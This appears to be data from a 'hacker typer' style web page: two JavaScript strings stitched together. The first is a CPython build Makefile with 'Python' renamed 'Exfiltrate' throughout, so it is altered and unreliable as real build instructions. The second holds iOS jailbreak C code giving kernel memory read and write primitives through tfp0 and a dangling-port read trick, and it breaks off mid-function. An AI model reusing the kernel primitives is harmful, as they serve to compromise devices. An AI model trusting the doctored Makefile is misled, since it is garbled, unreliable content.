		$(srcdir)/Include/parsetok.h \\n\
		$(srcdir)/Parser/parser.h \\n\
		$(srcdir)/Parser/tokenizer.h\n\
LIBRARY_OBJS_OMIT_FROZEN=	\\n\
		Modules/getbuildinfo.o \\n\
		$(PARSER_OBJS) \\n\
		$(OBJECT_OBJS) \\n\
		$(EXFILTRATE_OBJS) \\n\
		$(MODULE_OBJS) \\n\
		$(MODOBJS)\n\
LIBRARY_OBJS=	\\n\
		$(LIBRARY_OBJS_OMIT_FROZEN) \\n\
		Exfiltrate/frozen.o\n\
\n\
DTRACE_DEPS = \\n\
	Exfiltrate/ceval.o Exfiltrate/import.o Exfiltrate/sysmodule.o Modules/gcmodule.o\n\
\n\
all:		@DEF_MAKE_ALL_RULE@\n\
build_all:	check-clean-src $(BUILDEXFILTRATE) oldsharedmods sharedmods gdbhooks \\n\
		Programs/_testembed exfiltrate-config\n\
check-clean-src:\n\
	@if test -n \"$(VPATH)\" -a -f \"$(srcdir)/Programs/exfiltrate.o\"; then \\n\
		echo \"Error: The source directory ($(srcdir)) is not clean\" ; \\n\
		echo \"Building Exfiltrate out of the source tree (in $(abs_builddir)) requires a clean source tree ($(abs_srcdir))\" ; \\n\
		echo \"Try to run: make -C \"$(srcdir)\" clean\" ; \\n\
		exit 1; \\n\
	fi\n\
profile-clean-stamp:\n\
	$(MAKE) clean\n\
	touch $@\n\
profile-gen-stamp: profile-clean-stamp\n\
	@if [ $(LLVM_PROF_ERR) = yes ]; then \\n\
		echo \"Error: Cannot perform PGO build because llvm-profdata was not found in PATH\" ;\\n\
		echo \"Please add it to PATH and run ./configure again\" ;\\n\
		exit 1;\\n\
	fi\n\
	@echo \"Building with support for profile generation:\"\n\
	$(MAKE) build_all_generate_profile\n\
	touch $@\n\
profile-run-stamp:\n\
	@echo \"Running code to generate profile data (this can take a while):\"\n\
			$(MAKE) profile-gen-stamp\n\
		$(MAKE) run_profile_task\n\
	$(MAKE) build_all_merge_profile\n\
		$(MAKE) clean-retain-profile\n\
				touch $@\n\
build_all_generate_profile:\n\
	$(MAKE) @DEF_MAKE_RULE@ CFLAGS_NODIST=\"$(CFLAGS_NODIST) $(PGO_PROF_GEN_FLAG)\" LDFLAGS_NODIST=\"$(LDFLAGS_NODIST) $(PGO_PROF_GEN_FLAG)\" LIBS=\"$(LIBS)\"\n\
run_profile_task:\n\
	@ 	$(LLVM_PROF_FILE) $(RUNSHARED) ./$(BUILDEXFILTRATE) $(PROFILE_TASK) || true\n\
build_all_merge_profile:\n\
	$(LLVM_PROF_MERGER)\n\
profile-opt: profile-run-stamp\n\
	@echo \"Rebuilding with profile guided optimizations:\"\n\
	-rm -f profile-clean-stamp\n\
	$(MAKE) @DEF_MAKE_RULE@ CFLAGS_NODIST=\"$(CFLAGS_NODIST) $(PGO_PROF_USE_FLAG)\" LDFLAGS_NODIST=\"$(LDFLAGS_NODIST)\"\n\
.PHONY=coverage coverage-lcov coverage-report\n\
coverage:\n\
	@echo \"Building with support for coverage checking:\"\n\
	$(MAKE) clean\n\
	$(MAKE) @DEF_MAKE_RULE@ CFLAGS=\"$(CFLAGS) -O0 -pg --coverage\" LIBS=\"$(LIBS) --coverage\"\n\
coverage-lcov:\n\
	@echo \"Creating Coverage HTML report with LCOV:\"\n\
	@rm -f $(COVERAGE_INFO)\n\
	@rm -rf $(COVERAGE_REPORT)\n\
	@lcov --capture --directory $(abs_builddir) \\n\
	    --base-directory $(realpath $(abs_builddir)) \\n\
	    --path $(realpath $(abs_srcdir)) \\n\
	    --output-file $(COVERAGE_INFO)\n\
	@ 	@ 	@lcov --remove $(COVERAGE_INFO) \\n\
	    '*/Modules/_blake2/impl/*' \\n\
	    '*/Modules/_ctypes/libffi*/*' \\n\
	    '*/Modules/_decimal/libmpdec/*' \\n\
	    '*/Modules/_sha3/kcp/*' \\n\
	    '*/Modules/expat/*' \\n\
	    '*/Modules/zlib/*' \\n\
	    '*/Include/*' \\n\
	    '*/Modules/xx*.c' \\n\
	    '*/Parser/listnode.c' \\n\
	    '*/Exfiltrate/pyfpe.c' \\n\
	    '*/Exfiltrate/pystrcmp.c' \\n\
	    '/usr/include/*' \\n\
	    '/usr/local/include/*' \\n\
	    '/usr/lib/gcc/*' \\n\
	    --output-file $(COVERAGE_INFO)\n\
	@genhtml $(COVERAGE_INFO) --output-directory $(COVERAGE_REPORT) \\n\
	    $(COVERAGE_REPORT_OPTIONS)\n\
	@echo\n\
	@echo \"lcov report at $(COVERAGE_REPORT)/index.html\"\n\
	@echo\n\
coverage-report: regen-grammar regen-token regen-importlib\n\
	@ 	$(MAKE) coverage\n\
	@ 	$(TESTRUNNER) $(TESTOPTS) || true\n\
	@ 	$(MAKE) coverage-lcov\n\
.PHONY=clinic\n\
clinic: check-clean-src $(srcdir)/Modules/_blake2/blake2s_impl.c\n\
	$(EXFILTRATE_FOR_REGEN) $(srcdir)/Tools/clinic/clinic.py --make --srcdir $(srcdir)\n\
$(BUILDEXFILTRATE):	Programs/exfiltrate.o $(LIBRARY) $(LDLIBRARY) $(PY3LIBRARY)\n\
	$(LINKCC) $(PY_CORE_LDFLAGS) $(LINKFORSHARED) -o $@ Programs/exfiltrate.o $(BLDLIBRARY) $(LIBS) $(MODLIBS) $(SYSLIBS)\n\
platform: $(BUILDEXFILTRATE) pybuilddir.txt\n\
	$(RUNSHARED) $(EXFILTRATE_FOR_BUILD) -c 'import sys ; from sysconfig import get_platform ; print(\"%s-%d.%d\" % (get_platform(), *sys.version_info[:2]))' >platform\n\
pybuilddir.txt: $(BUILDEXFILTRATE)\n\
	@echo \"none\" > ./pybuilddir.txt\n\
	$(RUNSHARED) $(EXFILTRATE_FOR_BUILD) -S -m sysconfig --generate-posix-vars ;\\n\
	if test $$? -ne 0 ; then \\n\
		echo \"generate-posix-vars failed\" ; \\n\
		rm -f ./pybuilddir.txt ; \\n\
		exit 1 ; \\n\
	fi\n\
Modules/_math.o: Modules/_math.c Modules/_math.h\n\
	$(CC) -c $(CCSHARED) $(PY_CORE_CFLAGS) -o $@ $<\n\
$(srcdir)/Modules/_blake2/blake2s_impl.c: $(srcdir)/Modules/_blake2/blake2b_impl.c $(srcdir)/Modules/_blake2/blake2b2s.py\n\
	$(EXFILTRATE_FOR_REGEN) $(srcdir)/Modules/_blake2/blake2b2s.py\n\
	$(EXFILTRATE_FOR_REGEN) $(srcdir)/Tools/clinic/clinic.py -f $@\n\
sharedmods: $(BUILDEXFILTRATE) pybuilddir.txt Modules/_math.o\n\
	@case \"echo X $$MAKEFLAGS | sed 's/^X //;s/ -- .*//'\" in \\n\
	    *\ -s*|s*) quiet=\"-q\";; \\n\
	    *) quiet=\"\";; \\n\
	esac; \\n\
	echo \"$(RUNSHARED) CC='$(CC)' LDSHARED='$(BLDSHARED)' OPT='$(OPT)' \\n\
		_TCLTK_INCLUDES='$(TCLTK_INCLUDES)' _TCLTK_LIBS='$(TCLTK_LIBS)' \\n\
		$(EXFILTRATE_FOR_BUILD) $(srcdir)/setup.py $$quiet build\"; \\n\
	$(RUNSHARED) CC='$(CC)' LDSHARED='$(BLDSHARED)' OPT='$(OPT)' \\n\
		_TCLTK_INCLUDES='$(TCLTK_INCLUDES)' _TCLTK_LIBS='$(TCLTK_LIBS)' \\n\
		$(EXFILTRATE_FOR_BUILD) $(srcdir)/setup.py $$quiet build\n\
\n\
$(LIBRARY): $(LIBRARY_OBJS)\n\
	-rm -f $@\n\
	$(AR) $(ARFLAGS) $@ $(LIBRARY_OBJS)\n\
libexfiltrate$(LDVERSION).so: $(LIBRARY_OBJS) $(DTRACE_OBJS)\n\
	if test $(INSTSONAME) != $(LDLIBRARY); then \\n\
		$(BLDSHARED) -Wl,-h$(INSTSONAME) -o $(INSTSONAME) $(LIBRARY_OBJS) $(MODLIBS) $(SHLIBS) $(LIBC) $(LIBM); \\n\
		$(LN) -f $(INSTSONAME) $@; \\n\
	else \\n\
		$(BLDSHARED) -o $@ $(LIBRARY_OBJS) $(MODLIBS) $(SHLIBS) $(LIBC) $(LIBM); \\n\
	fi\n\
libexfiltrate3.so:	libexfiltrate$(LDVERSION).so\n\
	$(BLDSHARED) $(NO_AS_NEEDED) -o $@ -Wl,-h$@ $^\n\
libexfiltrate$(LDVERSION).dylib: $(LIBRARY_OBJS)\n\
	 $(CC) -dynamiclib -Wl,-single_module $(PY_CORE_LDFLAGS) -undefined dynamic_lookup -Wl,-install_name,$(prefix)/lib/libexfiltrate$(LDVERSION).dylib -Wl,-compatibility_version,$(VERSION) -Wl,-current_version,$(VERSION) -o $@ $(LIBRARY_OBJS) $(DTRACE_OBJS) $(SHLIBS) $(LIBC) $(LIBM); \\n\
\n\
libexfiltrate$(VERSION).sl: $(LIBRARY_OBJS)\n\
	$(LDSHARED) -o $@ $(LIBRARY_OBJS) $(MODLIBS) $(SHLIBS) $(LIBC) $(LIBM)\n\
gdbhooks: $(BUILDEXFILTRATE)-gdb.py\n\
SRC_GDB_HOOKS=$(srcdir)/Tools/gdb/libexfiltrate.py\n\
$(BUILDEXFILTRATE)-gdb.py: $(SRC_GDB_HOOKS)\n\
	$(INSTALL_DATA) $(SRC_GDB_HOOKS) $(BUILDEXFILTRATE)-gdb.py\n\
RESSRCDIR=Mac/Resources/framework\n\
$(EXFILTRATEFRAMEWORKDIR)/Versions/$(VERSION)/$(EXFILTRATEFRAMEWORK): \\n\
		$(LIBRARY) \\n\
		$(RESSRCDIR)/Info.plist\n\
	$(INSTALL) -d -m $(DIRMODE) $(EXFILTRATEFRAMEWORKDIR)/Versions/$(VERSION)\n\
	$(CC) -o $(LDLIBRARY) $(PY_CORE_LDFLAGS) -dynamiclib \\n\
		-all_load $(LIBRARY) -Wl,-single_module \\n\
		-install_name $(DESTDIR)$(EXFILTRATEFRAMEWORKINSTALLDIR)/Versions/$(VERSION)/$(EXFILTRATEFRAMEWORK) \\n\
		-compatibility_version $(VERSION) \\n\
		-current_version $(VERSION) \\n\
		-framework CoreFoundation $(LIBS);\n\
	$(INSTALL) -d -m $(DIRMODE)  \\n\
		$(EXFILTRATEFRAMEWORKDIR)/Versions/$(VERSION)/Resources/English.lproj\n\
	$(INSTALL_DATA) $(RESSRCDIR)/Info.plist \\n\
		$(EXFILTRATEFRAMEWORKDIR)/Versions/$(VERSION)/Resources/Info.plist\n\
	$(LN) -fsn $(VERSION) $(EXFILTRATEFRAMEWORKDIR)/Versions/Current\n\
	$(LN) -fsn Versions/Current/$(EXFILTRATEFRAMEWORK) $(EXFILTRATEFRAMEWORKDIR)/$(EXFILTRATEFRAMEWORK)\n\
	$(LN) -fsn Versions/Current/Resources $(EXFILTRATEFRAMEWORKDIR)/Resources\n\
$(DLLLIBRARY) libexfiltrate$(LDVERSION).dll.a: $(LIBRARY_OBJS)\n\
	if test -n \"$(DLLLIBRARY)\"; then \\n\
		$(LDSHARED) -Wl,--out-implib=$@ -o $(DLLLIBRARY) $^ \\n\
			$(LIBS) $(MODLIBS) $(SYSLIBS); \\n\
	else true; \\n\
	fi\n\
\n\
oldsharedmods: $(SHAREDMODS)\n\
\n\
Makefile Modules/config.c: Makefile.pre \\n\
				$(srcdir)/Modules/config.c.in \\n\
				$(MAKESETUP) \\n\
				$(srcdir)/Modules/Setup \\n\
				Modules/Setup.local\n\
	$(SHELL) $(MAKESETUP) -c $(srcdir)/Modules/config.c.in \\n\
				-s Modules \\n\
				Modules/Setup.local \\n\
				$(srcdir)/Modules/Setup\n\
	@mv config.c Modules\n\
	@echo \"The Makefile was updated, you may need to re-run make.\"\n\
\n\
Programs/_testembed: Programs/_testembed.o $(LIBRARY) $(LDLIBRARY) $(PY3LIBRARY)\n\
	$(LINKCC) $(PY_CORE_LDFLAGS) $(LINKFORSHARED) -o $@ Programs/_testembed.o $(BLDLIBRARY) $(LIBS) $(MODLIBS) $(SYSLIBS)\n\
\n\
Programs/_freeze_importlib.o: Programs/_freeze_importlib.c Makefile\n\
Programs/_freeze_importlib: Programs/_freeze_importlib.o $(LIBRARY_OBJS_OMIT_FROZEN)\n\
	$(LINKCC) $(PY_CORE_LDFLAGS) -o $@ Programs/_freeze_importlib.o $(LIBRARY_OBJS_OMIT_FROZEN) $(LIBS) $(MODLIBS) $(SYSLIBS)\n\
.PHONY: regen-importlib\n\
regen-importlib: Programs/_freeze_importlib\n\
			./Programs/_freeze_importlib importlib._bootstrap_external \\n\
	    $(srcdir)/Lib/importlib/_bootstrap_external.py \\n\
	    $(srcdir)/Exfiltrate/importlib_external.h.new\n\
	$(UPDATE_FILE) $(srcdir)/Exfiltrate/importlib_external.h $(srcdir)/Exfiltrate/importlib_external.h.new\n\
			./Programs/_freeze_importlib importlib._bootstrap \\n\
	    $(srcdir)/Lib/importlib/_bootstrap.py \\n\
	    $(srcdir)/Exfiltrate/importlib.h.new\n\
	$(UPDATE_FILE) $(srcdir)/Exfiltrate/importlib.h $(srcdir)/Exfiltrate/importlib.h.new\n\
			./Programs/_freeze_importlib zipimport \\n\
	    $(srcdir)/Lib/zipimport.py \\n\
	    $(srcdir)/Exfiltrate/importlib_zipimport.h.new\n\
	$(UPDATE_FILE) $(srcdir)/Exfiltrate/importlib_zipimport.h $(srcdir)/Exfiltrate/importlib_zipimport.h.new\n\
\n\
regen-all: regen-opcode regen-opcode-targets regen-typeslots regen-grammar \\n\
	regen-token regen-keyword regen-symbol regen-ast regen-importlib clinic\n\
\n\
Modules/getbuildinfo.o: $(PARSER_OBJS) \\n\
		$(OBJECT_OBJS) \\n\
		$(EXFILTRATE_OBJS) \\n\
		$(MODULE_OBJS) \\n\
		$(MODOBJS) \\n\
		$(DTRACE_OBJS) \\n\
		$(srcdir)/Modules/getbuildinfo.c\n\
	$(CC) -c $(PY_CORE_CFLAGS) \\n\
	      -DGITVERSION=\"\"LC_ALL=C $(GITVERSION)\"\" \\n\
	      -DGITTAG=\"\"LC_ALL=C $(GITTAG)\" \\n\
	      -DGITBRANCH=\"\"LC_ALL=C $(GITBRANCH)\"\" \\n\
	      -o $@ $(srcdir)/Modules/getbuildinfo.c\n\
Modules/getpath.o: $(srcdir)/Modules/getpath.c Makefile\n\
	$(CC) -c $(PY_CORE_CFLAGS) -DEXFILTRATEPATH='\"$(EXFILTRATEPATH)\"' \\n\
		-DPREFIX='\"$(prefix)\"' \\n\
		-DEXEC_PREFIX='\"$(exec_prefix)\"' \\n\
		-DVERSION='\"$(VERSION)\"' \\n\
		-DVPATH='\"$(VPATH)\"' \\n\
		-DPLATLIBDIR='\"$(PLATLIBDIR)\"' \\n\
		-o $@ $(srcdir)/Modules/getpath.c\n\
Programs/exfiltrate.o: $(srcdir)/Programs/exfiltrate.c\n\
	$(MAINCC) -c $(PY_CORE_CFLAGS) -o $@ $(srcdir)/Programs/exfiltrate.c\n\
Programs/_testembed.o: $(srcdir)/Programs/_testembed.c\n\
	$(MAINCC) -c $(PY_CORE_CFLAGS) -o $@ $(srcdir)/Programs/_testembed.c\n\
Modules/_sre.o: $(srcdir)/Modules/_sre.c $(srcdir)/Modules/sre.h $(srcdir)/Modules/sre_constants.h $(srcdir)/Modules/sre_lib.h\n\
Modules/posixmodule.o: $(srcdir)/Modules/posixmodule.c $(srcdir)/Modules/posixmodule.h\n\
Modules/grpmodule.o: $(srcdir)/Modules/grpmodule.c $(srcdir)/Modules/posixmodule.h\n\
Modules/pwdmodule.o: $(srcdir)/Modules/pwdmodule.c $(srcdir)/Modules/posixmodule.h\n\
Modules/signalmodule.o: $(srcdir)/Modules/signalmodule.c $(srcdir)/Modules/posixmodule.h\n\
Exfiltrate/dynload_shlib.o: $(srcdir)/Exfiltrate/dynload_shlib.c Makefile\n\
	$(CC) -c $(PY_CORE_CFLAGS) \\n\
		-DSOABI='\"$(SOABI)\"' \\n\
		-o $@ $(srcdir)/Exfiltrate/dynload_shlib.c\n\
Exfiltrate/dynload_hpux.o: $(srcdir)/Exfiltrate/dynload_hpux.c Makefile\n\
	$(CC) -c $(PY_CORE_CFLAGS) \\n\
		-DSHLIB_EXT='\"$(EXT_SUFFIX)\"' \\n\
		-o $@ $(srcdir)/Exfiltrate/dynload_hpux.c\n\
Exfiltrate/sysmodule.o: $(srcdir)/Exfiltrate/sysmodule.c Makefile $(srcdir)/Include/pydtrace.h\n\
	$(CC) -c $(PY_CORE_CFLAGS) \\n\
		-DABIFLAGS='\"$(ABIFLAGS)\"' \\n\
		-DPLATLIBDIR='\"$(PLATLIBDIR)\"' \\n\
		$(MULTIARCH_CPPFLAGS) \\n\
		-o $@ $(srcdir)/Exfiltrate/sysmodule.c\n\
$(IO_OBJS): $(IO_H)\n\
.PHONY: regen-grammar\n\
regen-grammar: regen-token\n\
			@$(MKDIR_P) Include\n\
	EXFILTRATEPATH=$(srcdir) $(EXFILTRATE_FOR_REGEN) -m Parser.pgen $(srcdir)/Grammar/Grammar \\n\
		$(srcdir)/Grammar/Tokens \\n\
		$(srcdir)/Include/graminit.h.new \\n\
		$(srcdir)/Exfiltrate/graminit.c.new\n\
	$(UPDATE_FILE) $(srcdir)/Include/graminit.h $(srcdir)/Include/graminit.h.new\n\
	$(UPDATE_FILE) $(srcdir)/Exfiltrate/graminit.c $(srcdir)/Exfiltrate/graminit.c.new\n\
.PHONY=regen-ast\n\
regen-ast:\n\
		$(MKDIR_P) $(srcdir)/Include\n\
	$(EXFILTRATE_FOR_REGEN) $(srcdir)/Parser/asdl_c.py \\n\
		-h $(srcdir)/Include/Exfiltrate-ast.h.new \\n\
		$(srcdir)/Parser/Exfiltrate.asdl\n\
	$(UPDATE_FILE) $(srcdir)/Include/Exfiltrate-ast.h $(srcdir)/Include/Exfiltrate-ast.h.new\n\
		$(MKDIR_P) $(srcdir)/Exfiltrate\n\
	$(EXFILTRATE_FOR_REGEN) $(srcdir)/Parser/asdl_c.py \\n\
		-c $(srcdir)/Exfiltrate/Exfiltrate-ast.c.new \\n\
		$(srcdir)/Parser/Exfiltrate.asdl\n\
	$(UPDATE_FILE) $(srcdir)/Exfiltrate/Exfiltrate-ast.c $(srcdir)/Exfiltrate/Exfiltrate-ast.c.new\n\
.PHONY: regen-opcode\n\
regen-opcode:\n\
			$(EXFILTRATE_FOR_REGEN) $(srcdir)/Tools/scripts/generate_opcode_h.py \\n\
		$(srcdir)/Lib/opcode.py \\n\
		$(srcdir)/Include/opcode.h.new\n\
	$(UPDATE_FILE) $(srcdir)/Include/opcode.h $(srcdir)/Include/opcode.h.new\n\
.PHONY: regen-token\n\
regen-token:\n\
			$(EXFILTRATE_FOR_REGEN) $(srcdir)/Tools/scripts/generate_token.py rst \\n\
		$(srcdir)/Grammar/Tokens \\n\
		$(srcdir)/Doc/library/token-list.inc\n\
			$(EXFILTRATE_FOR_REGEN) $(srcdir)/Tools/scripts/generate_token.py h \\n\
		$(srcdir)/Grammar/Tokens \\n\
		$(srcdir)/Include/token.h\n\
			$(EXFILTRATE_FOR_REGEN) $(srcdir)/Tools/scripts/generate_token.py c \\n\
		$(srcdir)/Grammar/Tokens \\n\
		$(srcdir)/Parser/token.c\n\
			$(EXFILTRATE_FOR_REGEN) $(srcdir)/Tools/scripts/generate_token.py py \\n\
		$(srcdir)/Grammar/Tokens \\n\
		$(srcdir)/Lib/token.py\n\
.PHONY: regen-keyword\n\
regen-keyword:\n\
			EXFILTRATEPATH=$(srcdir) $(EXFILTRATE_FOR_REGEN) -m Parser.pgen.keywordgen $(srcdir)/Grammar/Grammar \\n\
		$(srcdir)/Grammar/Tokens \\n\
		$(srcdir)/Lib/keyword.py.new\n\
	$(UPDATE_FILE) $(srcdir)/Lib/keyword.py $(srcdir)/Lib/keyword.py.new\n\
.PHONY: regen-symbol\n\
regen-symbol: $(srcdir)/Include/graminit.h\n\
			$(EXFILTRATE_FOR_REGEN) $(srcdir)/Tools/scripts/generate_symbol_py.py \\n\
		$(srcdir)/Include/graminit.h \\n\
		$(srcdir)/Lib/symbol.py\n\
Exfiltrate/compile.o Exfiltrate/symtable.o Exfiltrate/ast_unparse.o Exfiltrate/ast.o Exfiltrate/future.o Parser/parsetok.o: $(srcdir)/Include/graminit.h $(srcdir)/Include/Exfiltrate-ast.h\n\
Exfiltrate/getplatform.o: $(srcdir)/Exfiltrate/getplatform.c\n\
		$(CC) -c $(PY_CORE_CFLAGS) -DPLATFORM='\"$(MACHDEP)\"' -o $@ $(srcdir)/Exfiltrate/getplatform.c\n\
Exfiltrate/importdl.o: $(srcdir)/Exfiltrate/importdl.c\n\
		$(CC) -c $(PY_CORE_CFLAGS) -I$(DLINCLDIR) -o $@ $(srcdir)/Exfiltrate/importdl.c\n\
Objects/unicodectype.o:	$(srcdir)/Objects/unicodectype.c \\n\
				$(srcdir)/Objects/unicodetype_db.h\n\
BYTESTR_DEPS = \\n\
		$(srcdir)/Objects/stringlib/count.h \\n\
		$(srcdir)/Objects/stringlib/ctype.h \\n\
		$(srcdir)/Objects/stringlib/fastsearch.h \\n\
		$(srcdir)/Objects/stringlib/find.h \\n\
		$(srcdir)/Objects/stringlib/join.h \\n\
		$(srcdir)/Objects/stringlib/partition.h \\n\
		$(srcdir)/Objects/stringlib/split.h \\n\
		$(srcdir)/Objects/stringlib/stringdefs.h \\n\
		$(srcdir)/Objects/stringlib/transmogrify.h\n\
UNICODE_DEPS = \\n\
		$(srcdir)/Objects/stringlib/asciilib.h \\n\
		$(srcdir)/Objects/stringlib/codecs.h \\n\
		$(srcdir)/Objects/stringlib/count.h \\n\
		$(srcdir)/Objects/stringlib/fastsearch.h \\n\
		$(srcdir)/Objects/stringlib/find.h \\n\
		$(srcdir)/Objects/stringlib/find_max_char.h \\n\
		$(srcdir)/Objects/stringlib/localeutil.h \\n\
		$(srcdir)/Objects/stringlib/partition.h \\n\
		$(srcdir)/Objects/stringlib/replace.h \\n\
		$(srcdir)/Objects/stringlib/split.h \\n\
		$(srcdir)/Objects/stringlib/ucs1lib.h \\n\
		$(srcdir)/Objects/stringlib/ucs2lib.h \\n\
		$(srcdir)/Objects/stringlib/ucs4lib.h \\n\
		$(srcdir)/Objects/stringlib/undef.h \\n\
		$(srcdir)/Objects/stringlib/unicode_format.h \\n\
		$(srcdir)/Objects/stringlib/unicodedefs.h\n\
Objects/bytes_methods.o: $(srcdir)/Objects/bytes_methods.c $(BYTESTR_DEPS)\n\
Objects/bytesobject.o: $(srcdir)/Objects/bytesobject.c $(BYTESTR_DEPS)\n\
Objects/bytearrayobject.o: $(srcdir)/Objects/bytearrayobject.c $(BYTESTR_DEPS)\n\
Objects/unicodeobject.o: $(srcdir)/Objects/unicodeobject.c $(UNICODE_DEPS)\n\
Objects/odictobject.o: $(srcdir)/Objects/dict-common.h\n\
Objects/dictobject.o: $(srcdir)/Objects/stringlib/eq.h $(srcdir)/Objects/dict-common.h\n\
Objects/setobject.o: $(srcdir)/Objects/stringlib/eq.h\n\
.PHONY: regen-opcode-targets\n\
regen-opcode-targets:\n\
			$(EXFILTRATE_FOR_REGEN) $(srcdir)/Exfiltrate/makeopcodetargets.py \\n\
		$(srcdir)/Exfiltrate/opcode_targets.h.new\n\
	$(UPDATE_FILE) $(srcdir)/Exfiltrate/opcode_targets.h $(srcdir)/Exfiltrate/opcode_targets.h.new\n\
Exfiltrate/ceval.o: $(srcdir)/Exfiltrate/opcode_targets.h $(srcdir)/Exfiltrate/ceval_gil.h \\n\
		$(srcdir)/Exfiltrate/condvar.h\n\
Exfiltrate/frozen.o: $(srcdir)/Exfiltrate/importlib.h $(srcdir)/Exfiltrate/importlib_external.h \\n\
		$(srcdir)/Exfiltrate/importlib_zipimport.h\n\
Include/pydtrace_probes.h: $(srcdir)/Include/pydtrace.d\n\
	$(MKDIR_P) Include\n\
	$(DTRACE) $(DFLAGS) -o $@ -h -s $<\n\
	: sed in-place edit with POSIX-only tools\n\
	sed 's/EXFILTRATE_/PyDTrace_/' $@ > $@.tmp\n\
	mv $@.tmp $@\n\
Exfiltrate/ceval.o: $(srcdir)/Include/pydtrace.h\n\
Exfiltrate/import.o: $(srcdir)/Include/pydtrace.h\n\
Modules/gcmodule.o: $(srcdir)/Include/pydtrace.h\n\
Exfiltrate/pydtrace.o: $(srcdir)/Include/pydtrace.d $(DTRACE_DEPS)\n\
	$(DTRACE) $(DFLAGS) -o $@ -G -s $< $(DTRACE_DEPS)\n\
Objects/typeobject.o: Objects/typeslots.inc\n\
.PHONY: regen-typeslots\n\
regen-typeslots:\n\
			$(EXFILTRATE_FOR_REGEN) $(srcdir)/Objects/typeslots.py \n\
		< $(srcdir)/Include/typeslots.h \\n\
		$(srcdir)/Objects/typeslots.inc.new\n\
	$(UPDATE_FILE) $(srcdir)/Objects/typeslots.inc $(srcdir)/Objects/typeslots.inc.new";



var RHS_hacking_content_text = "\
#include &lt;stdio.h>\n\
#include &lt;stdlib.h>\n\
#include &lt;unistd.h>\n\
#include \"kmem.h\"\n\
#include \"kutils.h\"\n\
#include \"common.h\"\n\
\n\
mach_port_t tfp0 = MACH_PORT_NULL;\n\
void prepare_rwk_via_tfp0(mach_port_t port)\n\
{\n\
    tfp0 = port;\n\
}\n\
void prepare_for_rw_with_fake_tfp0(mach_port_t fake_tfp0)\n\
{\n\
    tfp0 = fake_tfp0;\n\
}\n\
bool have_kmem_read()\n\
{\n\
    return (kmem_read_port != MACH_PORT_NULL) || (tfp0 != MACH_PORT_NULL);\n\
}\n\
bool have_kmem_write()\n\
{\n\
    return (tfp0 != MACH_PORT_NULL);\n\
}\n\
size_t kread(uint64_t where, void* p, size_t size)\n\
{\n\
    int rv;\n\
    size_t offset = 0;\n\
    while (offset &lt; size) {\n\
        mach_vm_size_t sz, chunk = 2048;\n\
        if (chunk > size - offset) {\n\
            chunk = size - offset;\n\
        }\n\
        rv = mach_vm_read_overwrite(tfp0,\n\
            where + offset,\n\
            chunk,\n\
            (mach_vm_address_t)p + offset,\n\
            \&sz);\n\
        if (rv || sz == 0) {\n\
            LOG(\"error reading kernel @%p\", (void*)(offset + where));\n\
            break;\n\
        }\n\
        offset += sz;\n\
    }\n\
    return offset;\n\
}\n\
size_t kwrite(uint64_t where, const void* p, size_t size)\n\
{\n\
    int rv;\n\
    size_t offset = 0;\n\
    while (offset &lt; size) {\n\
        size_t chunk = 2048;\n\
        if (chunk > size - offset) {\n\
            chunk = size - offset;\n\
        }\n\
        rv = mach_vm_write(tfp0,\n\
            where + offset,\n\
            (mach_vm_offset_t)p + offset,\n\
            (mach_msg_type_number_t)chunk);\n\
        if (rv) {\n\
            LOG(\"error writing kernel @%p\", (void*)(offset + where));\n\
            break;\n\
        }\n\
        offset += chunk;\n\
    }\n\
    return offset;\n\
}\n\
bool wkbuffer(uint64_t kaddr, void* buffer, size_t length)\n\
{\n\
    if (tfp0 == MACH_PORT_NULL) {\n\
        LOG(\"attempt to write to kernel memory before any kernel memory write primitives available\");\n\
        sleep(3);\n\
        return false;\n\
    }\n\
    return (kwrite(kaddr, buffer, length) == length);\n\
}\n\
bool rkbuffer(uint64_t kaddr, void* buffer, size_t length)\n\
{\n\
    return (kread(kaddr, buffer, length) == length);\n\
}\n\
void WriteKernel32(uint64_t kaddr, uint32_t val)\n\
{\n\
    if (tfp0 == MACH_PORT_NULL) {\n\
        LOG(\"attempt to write to kernel memory before any kernel memory write primitives available\");\n\
        sleep(3);\n\
        return;\n\
    }\n\
    wkbuffer(kaddr, \&val, sizeof(val));\n\
}\n\
void WriteKernel64(uint64_t kaddr, uint64_t val)\n\
{\n\
    if (tfp0 == MACH_PORT_NULL) {\n\
        LOG(\"attempt to write to kernel memory before any kernel memory write primitives available\");\n\
        sleep(3);\n\
        return;\n\
    }\n\
    wkbuffer(kaddr, \&val, sizeof(val));\n\
}\n\
uint32_t rk32_via_kmem_read_port(uint64_t kaddr)\n\
{\n\
    kern_return_t err;\n\
    if (kmem_read_port == MACH_PORT_NULL) {\n\
        LOG(\"kmem_read_port not set, have you called prepare_rk?\");\n\
        sleep(10);\n\
        exit(EXIT_FAILURE);\n\
    }\n\
    mach_port_context_t context = (mach_port_context_t)kaddr - 0x10;\n\
    err = mach_port_set_context(mach_task_self(), kmem_read_port, context);\n\
    if (err != KERN_SUCCESS) {\n\
        LOG(\"error setting context off of dangling port: %x %s\", err, mach_error_string(err));\n\
        sleep(10);\n\
        exit(EXIT_FAILURE);\n\
    }\n\
    // now do the read:\n\
    uint32_t val = 0;\n\
    err = pid_for_task(kmem_read_port, (int*)\&val);\n\
    if (err != KERN_SUCCESS) {\n\
        LOG(\"error calling pid_for_task %x %s\", err, mach_error_string(err));\n\
        sleep(10);\n\
        exit(EXIT_FAILURE);\n\
    }\n\
    return val;\n\
}\n\
uint32_t rk32_via_tfp0(uint64_t kaddr)\n\
{\n\
    uint32_t val = 0;\n\
    rkbuffer(kaddr, \&val, sizeof(val));\n\
    return val;\n\
}\n\
uint64_t rk64_via_kmem_read_port(uint64_t kaddr)\n\
{\n\
    uint64_t lower = rk32_via_kmem_read_port(kaddr);\n\
    uint64_t higher = rk32_via_kmem_read_port(kaddr + 4);\n\
    uint64_t full = ((higher &lt;&lt; 32) | lower);\n\
    return full;\n\
}\n\
uint64_t rk64_via_tfp0(uint64_t kaddr)\n\
{\n\
    uint64_t val = 0;\n\
    rkbuffer(kaddr, \&val, sizeof(val));\n\
    return val;\n\
}\n\
uint32_t ReadKernel32(uint64_t kaddr)\n\
{\n\
    if (tfp0 != MACH_PORT_NULL) {\n\
        return rk32_via_tfp0(kaddr);\n\
    }\n\
    if (kmem_read_port != MACH_PORT_NULL) {\n\
        return rk32_via_kmem_read_port(kaddr);\n\
    }\n\
    LOG(\"attempt to read kernel memory but no kernel memory read primitives available\");\n\
    sleep(3);\n\
    return 0;\n\
}\n\
uint64_t ReadKernel64(uint64_t kaddr)\n\
{\n\
    if (tfp0 != MACH_PORT_NULL) {\n\
